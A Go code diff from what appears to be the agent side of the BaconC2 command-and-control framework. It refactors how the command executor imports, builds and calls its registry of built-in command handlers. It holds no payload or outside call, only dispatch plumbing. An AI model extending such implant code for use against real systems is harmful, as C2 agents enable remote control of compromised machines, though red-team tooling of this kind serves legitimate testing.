@@ -8,9 +8,10 @@ import (
 	"time"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/config"
-	"github.com/RabbITCybErSeC/BaconC2/client/core/commands"
+	registry "github.com/RabbITCybErSeC/BaconC2/client/core/command_registry"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
+	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/formatter"
@@ -21,25 +22,25 @@ type DefaultCommandExecutor struct {
 	resultsQueue    queue.GenericQueue[models.CommandResult]
 	transport       transport.ITransportProtocol
 	config          *config.AgentConfig
-	commandRegistry *commands.CommandHandlerRegistry
+	commandRegistry *command_handler.CommandHandlerRegistry
 }
 
 func NewDefaultCommandExecutor(queue queue.GenericQueue[models.Command], resultsQueue queue.GenericQueue[models.CommandResult], transport transport.ITransportProtocol, streamingTransport local_models.IStreamingTransport, cfg *config.AgentConfig) models.ICommandExecutor {
-	registry := commands.NewCommandHandlerRegistry()
-	commands.RegisterBuiltInCommands(registry, resultsQueue, transport, streamingTransport)
+	cmdRegistry := command_handler.NewCommandHandlerRegistry()
+	registry.RegisterBuiltInCommands(cmdRegistry, resultsQueue, transport, streamingTransport)
 	return &DefaultCommandExecutor{
 		queue:           queue,
 		resultsQueue:    resultsQueue,
 		transport:       transport,
 		config:          cfg,
-		commandRegistry: registry,
+		commandRegistry: cmdRegistry,
 	}
 }
 
 func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.CommandResult {
 	if cmd.Type == models.CommandTypeInternal {
 		if handler, exists := e.commandRegistry.GetHandler(cmd.Command); exists {
-			return handler(cmd)
+			return handler.Handler(cmd)
 		}
 
 		result := models.CommandResult{
